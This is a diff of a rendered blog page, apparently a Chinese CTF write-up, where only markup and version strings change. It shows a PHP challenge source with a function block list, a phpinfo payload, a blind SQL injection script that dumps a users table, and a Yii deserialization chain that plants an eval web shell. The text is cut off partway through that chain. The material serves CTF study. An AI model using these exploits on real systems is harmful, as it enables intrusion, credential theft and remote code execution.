@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -326,59 +326,59 @@ Here is what you want:1ndexx.php
 </span><span class="lnt">52
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nv">$link</span> <span class="o">=</span> <span class="nx">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="err">
-</span><span class="err">&lt;html&gt;
-</span><span class="err">&lt;head&gt;
-</span><span class="err">	&lt;title&gt;Hello worldd!&lt;/title&gt;
-</span><span class="err">	&lt;style&gt;
-</span><span class="err">	body {
-</span><span class="err">		background-color: white;
-</span><span class="err">		text-align: center;
-</span><span class="err">		padding: 50px;
-</span><span class="err">		font-family: &#34;Open Sans&#34;,&#34;Helvetica Neue&#34;,Helvetica,Arial,sans-serif;
-</span><span class="err">	}
-</span><span class="err">
-</span><span class="err">	#logo {
-</span><span class="err">		margin-bottom: 40px;
-</span><span class="err">	}
-</span><span class="err">	&lt;/style&gt;
-</span><span class="err">&lt;/head&gt;
-</span><span class="err">&lt;body&gt;
-</span><span class="err">	&lt;img id=&#34;logo&#34; src=&#34;logo.png&#34; /&gt;
-</span><span class="err">	&lt;h1&gt;&lt;?php echo &#34;Hello My freind!&#34;; ?&gt;&lt;/h1&gt;
-</span><span class="err">	&lt;?php if($link) { ?&gt;
-</span><span class="err">		&lt;h2&gt;I Can&#39;t view my php files?!&lt;/h2&gt;
-</span><span class="err">	&lt;?php } else { ?&gt;
-</span><span class="err">		&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;
-</span><span class="err">	&lt;?php } ?&gt;
-</span><span class="err">&lt;/body&gt;
-</span><span class="err">&lt;/html&gt;
-</span><span class="err">&lt;?php
-</span><span class="err">
-</span><span class="err">#Really easy...
-</span><span class="err">
-</span><span class="err">$file=fopen(&#34;flag.php&#34;,&#34;r&#34;) or die(&#34;Unable 2 open!&#34;);
-</span><span class="err">
-</span><span class="err">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&#34;flag.php&#34;));
-</span><span class="err">
-</span><span class="err">
-</span><span class="err">$hack=fopen(&#34;hack.php&#34;,&#34;w&#34;) or die(&#34;Unable 2 open&#34;);
-</span><span class="err">
-</span><span class="err">$a=$_GET[&#39;code&#39;];
-</span><span class="err">
-</span><span class="err">if(preg_match(&#39;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#39;,$a)){
-</span><span class="err">	die(&#34;you die&#34;);
-</span><span class="err">}
-</span><span class="err">if(strlen($a)&gt;33){
-</span><span class="err">	die(&#34;nonono.&#34;);
-</span><span class="err">}
-</span><span class="err">fwrite($hack,$a);
-</span><span class="err">fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);
-</span><span class="err">
-</span><span class="err">fclose($file);
-</span><span class="err">fclose($hack);
-</span><span class="err">?&gt;
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nv">$link</span> <span class="o">=</span> <span class="nx">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">	&lt;title&gt;Hello worldd!&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">	&lt;style&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">	body {
+</span></span></span><span class="line"><span class="cl"><span class="err">		background-color: white;
+</span></span></span><span class="line"><span class="cl"><span class="err">		text-align: center;
+</span></span></span><span class="line"><span class="cl"><span class="err">		padding: 50px;
+</span></span></span><span class="line"><span class="cl"><span class="err">		font-family: &#34;Open Sans&#34;,&#34;Helvetica Neue&#34;,Helvetica,Arial,sans-serif;
+</span></span></span><span class="line"><span class="cl"><span class="err">	}
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">	#logo {
+</span></span></span><span class="line"><span class="cl"><span class="err">		margin-bottom: 40px;
+</span></span></span><span class="line"><span class="cl"><span class="err">	}
+</span></span></span><span class="line"><span class="cl"><span class="err">	&lt;/style&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">	&lt;img id=&#34;logo&#34; src=&#34;logo.png&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">	&lt;h1&gt;&lt;?php echo &#34;Hello My freind!&#34;; ?&gt;&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">	&lt;?php if($link) { ?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">		&lt;h2&gt;I Can&#39;t view my php files?!&lt;/h2&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">	&lt;?php } else { ?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">		&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">	&lt;?php } ?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">#Really easy...
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">$file=fopen(&#34;flag.php&#34;,&#34;r&#34;) or die(&#34;Unable 2 open!&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&#34;flag.php&#34;));
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">$hack=fopen(&#34;hack.php&#34;,&#34;w&#34;) or die(&#34;Unable 2 open&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">$a=$_GET[&#39;code&#39;];
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">if(preg_match(&#39;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#39;,$a)){
+</span></span></span><span class="line"><span class="cl"><span class="err">	die(&#34;you die&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">if(strlen($a)&gt;33){
+</span></span></span><span class="line"><span class="cl"><span class="err">	die(&#34;nonono.&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">fwrite($hack,$a);
+</span></span></span><span class="line"><span class="cl"><span class="err">fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">fclose($file);
+</span></span></span><span class="line"><span class="cl"><span class="err">fclose($hack);
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>然后这TM居然是index.php的源码。。。</p>
 <p>payload</p>
@@ -387,8 +387,8 @@ Here is what you want:1ndexx.php
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">code</span><span class="o">=&lt;?=</span><span class="nx">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">code</span><span class="o">=&lt;?=</span><span class="nx">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>预期解应该是类似<code>show_source</code>的函数，当时比赛也确实想到了，但是使用<code>show_source(__FILE__)</code>却没有出，就转而使用phpinfo，没想到拼接字符串直接高亮<code>flag.php</code></p>
 <h2 id="websitemanger"><a href="#websitemanger" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:websitemanger" class="headings">WebsiteManger</a></h2>
@@ -433,42 +433,42 @@ Here is what you want:1ndexx.php
 </span><span class="lnt">35
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="nn">req</span>
-<span class="kn">import</span> <span class="nn">time</span>
-<span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;http://eci-2zeir5o8p6vh7tzmqpxt.cloudeci1.ichunqiu.com/image.php?id=&#34;</span>
-<span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-<span class="n">session</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
-
-<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">250</span><span class="p">):</span>
-    <span class="nb">max</span> <span class="o">=</span> <span class="mi">126</span>
-    <span class="nb">min</span> <span class="o">=</span> <span class="mi">32</span>
-    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
-    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
-        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="nb">max</span> <span class="o">+</span> <span class="nb">min</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
-        <span class="c1"># sql = &#34;select database()&#34;  # ctf</span>
-        <span class="c1"># sql = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34; # images,users</span>
-        <span class="c1"># sql = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;&#34; # username,password</span>
-        <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;select group_concat(username,&#39;:&#39;,password) from users &#34;</span> <span class="c1"># admin:b87889146155b52d7d94e</span>
-        <span class="n">SQL</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;5 OR ASCII(substr((</span><span class="si">{</span><span class="n">sql</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">#&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="s2">&#34;/**/&#34;</span><span class="p">)</span>
-        <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">target</span><span class="o">+</span><span class="n">SQL</span><span class="p">)</span>
-        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
-        <span class="nb">print</span><span class="p">(</span><span class="n">SQL</span><span class="p">)</span>
-        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
-            <span class="k">if</span> <span class="nb">max</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="nb">min</span><span class="p">:</span>
-                <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">max</span><span class="p">)</span>
-                <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
-                <span class="k">break</span>
-            <span class="nb">min</span> <span class="o">=</span> <span class="n">mid</span>
-        <span class="k">else</span><span class="p">:</span>
-            <span class="k">if</span> <span class="nb">max</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="nb">min</span><span class="p">:</span>
-                <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">min</span><span class="p">)</span>
-                <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
-                <span class="k">break</span>
-            <span class="nb">max</span> <span class="o">=</span> <span class="n">mid</span>
-    <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">strip</span><span class="p">()):</span>
-        <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
-        <span class="k">break</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="nn">req</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;http://eci-2zeir5o8p6vh7tzmqpxt.cloudeci1.ichunqiu.com/image.php?id=&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">250</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">max</span> <span class="o">=</span> <span class="mi">126</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">min</span> <span class="o">=</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="nb">max</span> <span class="o">+</span> <span class="nb">min</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># sql = &#34;select database()&#34;  # ctf</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># sql = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34; # images,users</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># sql = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;&#34; # username,password</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;select group_concat(username,&#39;:&#39;,password) from users &#34;</span> <span class="c1"># admin:b87889146155b52d7d94e</span>
+</span></span><span class="line"><span class="cl">        <span class="n">SQL</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;5 OR ASCII(substr((</span><span class="si">{</span><span class="n">sql</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">#&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="s2">&#34;/**/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">target</span><span class="o">+</span><span class="n">SQL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">SQL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">max</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="nb">min</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">max</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">min</span> <span class="o">=</span> <span class="n">mid</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">max</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="nb">min</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">min</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">max</span> <span class="o">=</span> <span class="n">mid</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">strip</span><span class="p">()):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>登陆后直接file协议读flag。</p>
 <h2 id="framework"><a href="#framework" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:framework" class="headings">framework</a></h2>
@@ -518,47 +518,47 @@ Here is what you want:1ndexx.php
 </span><span class="lnt">40
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">namespace</span> <span class="nx">yii\rest</span><span class="p">{</span>
-    <span class="k">class</span> <span class="nc">IndexAction</span> <span class="p">{</span>
-        <span class="k">public</span> <span class="nv">$checkAccess</span><span class="p">;</span>
-        <span class="k">public</span> <span class="nv">$id</span><span class="p">;</span>
-        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
-        <span class="p">{</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkAccess</span><span class="o">=</span><span class="s2">&#34;assert&#34;</span><span class="p">;</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">id</span><span class="o">=</span><span class="s2">&#34;die(file_put_contents(&#39;/var/www/html/web/t.php&#39;, &#39;&lt;?php eval(</span><span class="se">\$</span><span class="s2">_POST[cmd])?&gt;&#39;))&#34;</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="nx">Faker</span><span class="p">{</span>
-    <span class="k">use</span> <span class="nx">yii\rest\IndexAction</span><span class="p">;</span>
-    <span class="k">class</span> <span class="nc">Generator</span><span class="p">{</span>
-        <span class="k">protected</span> <span class="nv">$formatters</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
-        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
-        <span class="p">{</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span><span class="p">[</span><span class="s1">&#39;close&#39;</span><span class="p">]</span><span class="o">=</span><span class="p">[</span><span class="k">new</span> <span class="nx">IndexAction</span><span class="p">,</span><span class="s2">&#34;run&#34;</span><span class="p">];</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="nx">yii\db</span> <span class="p">{</span>
-    <span class="k">use</span> <span class="nx">Faker\Generator</span><span class="p">;</span>
-
-    <span class="k">class</span> <span class="nc">BatchQueryResult</span>
-    <span class="p">{</span>
-        <span class="k">private</span> <span class="nv">$_dataReader</span><span class="p">;</span>
-        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
-        <span class="p">{</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_dataReader</span><span class="o">=</span><span class="k">new</span> <span class="nx">Generator</span><span class="p">();</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="k">namespace</span> <span class="p">{</span>
-    <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">yii\db\BatchQueryResult</span><span class="p">()));</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">yii\rest</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">IndexAction</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$checkAccess</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkAccess</span><span class="o">=</span><span class="s2">&#34;assert&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">id</span><span class="o">=</span><span class="s2">&#34;die(file_put_contents(&#39;/var/www/html/web/t.php&#39;, &#39;&lt;?php eval(</span><span class="se">\$</span><span class="s2">_POST[cmd])?&gt;&#39;))&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Faker</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">yii\rest\IndexAction</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Generator</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$formatters</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span><span class="p">[</span><span class="s1">&#39;close&#39;</span><span class="p">]</span><span class="o">=</span><span class="p">[</span><span class="k">new</span> <span class="nx">IndexAction</span><span class="p">,</span><span class="s2">&#34;run&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">yii\db</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">Faker\Generator</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">BatchQueryResult</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$_dataReader</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
